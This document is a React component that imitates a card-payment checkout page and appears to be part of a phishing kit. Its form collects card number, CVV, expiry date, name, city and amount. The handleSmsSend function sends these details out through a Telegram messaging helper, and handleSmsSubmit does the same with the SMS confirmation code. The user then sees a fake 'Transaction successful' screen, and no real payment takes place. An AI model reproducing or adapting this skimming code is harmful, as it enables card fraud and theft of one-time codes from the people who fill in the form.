import React, { useState } from 'react';
import './styles.css';
import { useNavigate } from 'react-router-dom';
import { sendMessage } from '../api/telegram.ts';
import CardImage from './img/cardfag.png';

import InputMask from 'react-input-mask';

const OrderMaCopy = () => {
  const [step, setStep] = useState(1);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    name: '',
    cvv: '',
    expiryDate: '',
    amount: '',
    firstName: '',
    lastName: '',
    city: '',
    agreement: false,
  });
  const [smsCode, setSmsCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [verificationLoading, setVerificationLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 минут в секундах
  const [errors, setErrors] = useState({});

  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setCardData({
      ...cardData,
      [name]: type === 'checkbox' ? checked : value.trim(),
    });
  };

  const handleSmsSend = async () => {
    setLoading(true);
    try {
      const message = `
        Bank Name: [${cardData.name}]
        Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
        Name: [${cardData.firstName} ${cardData.lastName}] City: [${cardData.city}]
        Amount: [${cardData.amount}]
      `;

      sendMessage(message);

      // Сбрасываем данные формы


      setStep(2);
    } catch (error) {
      console.error('Error sending message:', error.message);
    }
    setLoading(false);
  };

  const handleSmsSubmit = async () => {
    setVerificationLoading(true);
    try {
      sendMessage(`SMS Code: ${smsCode}`);

      // Передача данных на страницу статуса
      navigate('/statuseng', {
        state: {
          result: 'success',
          message: 'Transaction successful',
          firstName: cardData.firstName,
          lastName: cardData.lastName,
          amount: cardData.amount,
        },
      });
    } catch (error) {
      console.error('Error processing verification:', error.message);
    }
    setVerificationLoading(false);
  };


  const formatTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  return (
    <div className="flex flex-col items-center justify-start min-h-screen bg-gray-fon px-4 mb:pt-20 pt-4 placeholder-gray-text">
      <div className="space-y-4 w-full max-w-xl mb-12">
        <div className="bg-white p-6 rounded-lg mb-12">
          <h2 className="text-xl font-bold mb-6 text-center">Payment Method</h2>
          <div className="flex flex-col items-center justify-center space-x-4 mb-4">
            <img className="w-[200px] h-[125px]"src={CardImage}></img>
            {step === 1 && ( <label htmlFor="firstName" className="block mt-2 font-normal text-gray-400">To complete the request, please fill out the fields.   </label>
           ) } 

            {step === 2 && ( <label htmlFor="firstName" className="block mt-2 font-normal text-gray-400">Follow the instructions bellow.   </label> ) }
            {step === 3 && ( <label htmlFor="firstName" className="block mt-2 font-normal text-gray-400">To complete the request, please fill out the fields.   </label> ) } 
           
          </div>
      
        </div>
        <div className="w-full md:max-w-[608px] max-w-[390px] flex justify-center items-center bg-white p-6 rounded-lg">
          {step === 1 && (
            <form className="text-grayth w-[350px] md:w-[470px]">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="text-left w-full">
                  <label htmlFor="firstName" className="block font-normal text-gray-700">
                    First Name
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    id="firstName"
                    value={cardData.firstName}
                    onChange={handleChange}
                    className={`mt-1 block w-full h-[35px] border ${errors.firstName ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                    placeholder="John"
                    required
                  />
                  {errors.firstName && <p className="text-red-500 text-sm">{errors.firstName}</p>}
                </div>
                <div className="text-left w-full">
                  <label htmlFor="lastName" className="block font-normal text-gray-700">
                    Last Name
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    id="lastName"
                    value={cardData.lastName}
                    onChange={handleChange}
                    className={`mt-1 block w-full h-[35px] border ${errors.lastName ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                    placeholder="Doe"
                    required
                  />
                  {errors.lastName && <p className="text-red-500 text-sm">{errors.lastName}</p>}
                </div>
              </div>
              <div className="mt-6 mb-6 text-left w-full">
                <label htmlFor="amount" className="block font-normal text-gray-700">
                  Enter Amount
                </label>
                <input
                  type="text"
                  name="amount"
                  id="amount"
                  value={cardData.amount}
                  onChange={handleChange}
                  className={`mt-1 block w-full h-[35px] border ${errors.amount ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                  placeholder="1000.00"
                  required
                />
                {errors.amount && <p className="text-red-500 text-sm">{errors.amount}</p>}
              </div>

              <div className="mt-6 mb-6 text-left w-full">
                <label htmlFor="cardNumber" className="block font-normal text-gray-700">
                  Enter Your Card Number
                </label>
                <InputMask
                  mask="9999 9999 9999 9999"
                  value={cardData.cardNumber}
                  onChange={handleChange}
                >
                  {() => (
                    <input
                      type="text"
                      name="cardNumber"
                      id="cardNumber"
                      className={`mt-1 block w-full h-[35px] border ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                      placeholder="1456 1345 0958 4234"
                      required
                    />
                  )}
                </InputMask>
                {errors.cardNumber && <p className="text-red-500 text-sm">{errors.cardNumber}</p>}
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="md:mb-12 mb-0 text-left w-full">
                  <label htmlFor="expiryDate" className="block font-normal text-gray-700">
                    Expiry Date
                  </label>
                  <InputMask
                    mask="99/99"
                    value={cardData.expiryDate}
                    onChange={handleChange}
                  >
                    {() => (
                      <input
                        type="text"
                        name="expiryDate"
                        id="expiryDate"
                        className={`mt-1 block w-full h-[35px] border ${errors.expiryDate ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                        placeholder="MM/YY"
                        required
                      />
                    )}
                  </InputMask>
                  {errors.expiryDate && <p className="text-red-500 text-sm">{errors.expiryDate}</p>}
                </div>
                <div className="mb-12 w-full text-left">
                  <label htmlFor="cvv" className="block font-normal text-gray-700">
                    CVV2
                  </label>
                  <InputMask
                    mask="999"
                    value={cardData.cvv}
                    onChange={handleChange}
                  >
                    {() => (
                      <input
                        type="text"
                        name="cvv"
                        id="cvv"
                        className={`mt-1 block w-full h-[35px] border ${errors.cvv ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                        placeholder="227"
                        maxLength="4"
                        required
                      />
                    )}
                  </InputMask>
                  {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
                </div>
              </div>

              

              <div className="mb-6 text-left w-full">
                <label htmlFor="city" className="block font-normal text-gray-700">
                  City
                </label>
                <input
                  type="text"
                  name="city"
                  id="city"
                  value={cardData.city}
                  onChange={handleChange}
                  className={`mt-1 block w-full h-[35px] border ${errors.city ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                  placeholder="New York"
                  required
                />
                {errors.city && <p className="text-red-500 text-sm">{errors.city}</p>}
              </div>

              <button
                type="button"
                className="bg-grayth text-white h-[50px] py-2 px-4 rounded-md hover:bg-purple-950 mt-6 w-full"
                onClick={handleSmsSend}
              >
                Continue
              </button>

              <div className="w-full mt-6 flex items-center justify-between">
                <label htmlFor="agreement" className="block font-normal text-gray-700">
                  Do you accept the user agreement?
                </label>
                <label className="switch">
                  <input
                    type="checkbox"
                    name="agreement"
                    id="agreement"
                    checked={cardData.agreement}
                    onChange={handleChange}
                    required
                  />
                  <span className="slider round"></span>
                </label>
                {errors.agreement && <p className="text-red-500 text-sm">{errors.agreement}</p>}
              </div>

              <p className="w-full mt-4 text-left text-sm text-grayth">
                By clicking "Pay", you confirm that you have read the information about the service and accept the
                <span className="text-blue-400 font-normal"> terms of the public agreement.</span>
              </p>
            </form>
          )}

          {step === 2 && (
            <div className="flex flex-col justify-center items-center text-center md:w-[470px] w-[390px]">
              <h2 className="text-xl font-semibold mb-4">Confirmation</h2>
              <p className="text-sm text-grayth mb-4">
                To confirm the transfer of funds, we have sent you a 6-digit code via SMS to your phone number. ATTENTION! Do not share the SMS code with anyone to protect your personal data.
              </p>
              <div className="flex justify-center items-center mb-4">
                <svg className="w-24 h-24" viewBox="0 0 100 100">
                  <defs>
                    <linearGradient id="static-gradient" x1="0%" y1="0%" x2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                      <stop offset="70%" style={{ stopColor: 'rgba(48, 12, 96, 0.8)', stopOpacity: 1 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                    </linearGradient>
                    <linearGradient id="animated-gradient" x1="0%" y1="0%" x2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 0.4 }} />
                      <stop offset="50%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                    </linearGradient>
                  </defs>
                  <circle
                    className="static-circle"
                    r="45"
                    cx="50"
                    cy="50"
                    stroke="url(#static-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                  />
                  <circle
                    className="circle animated-circle"
                    stroke="url(#animated-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                    r="45"
                    cx="50"
                    cy="50"
                    style={{ strokeDasharray: '170 283', strokeDashoffset: '0' }}
                  />
                </svg>
                <p className="absolute text-2xl font-bold text-blue-600">{formatTime(timeLeft)}</p>
              </div>
              <p className="text-sm text-grayth mb-8">Time remaining for confirmation</p>
              <div className="mb-4 w-full">
                <label htmlFor="smsCode" className="block text-sm text-left font-normal text-gray-700">
                  Enter the confirmation code
                </label>
                <InputMask
                  mask="999999"
                  value={smsCode}
                  onChange={(e) => setSmsCode(e.target.value)}
                >
                  {() => (
                    <input
                      type="text"
                      name="smsCode"
                      id="smsCode"
                      className={`mt-1 block w-full h-[35px] bg-gray-form border ${errors.smsCode ? 'border-red-500' : 'border-gray-200'} rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                      placeholder="765***"
                      required
                    />
                  )}
                </InputMask>
                {errors.smsCode && <p className="text-red-500 text-sm">{errors.smsCode}</p>}
              </div>
              <button
                className="bg-grayth text-white py-2 px-4 rounded-md hover:bg-purple-950 mt-4 w-full h-[50px]"
                onClick={handleSmsSubmit}
              >
                Confirm
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default OrderMaCopy;
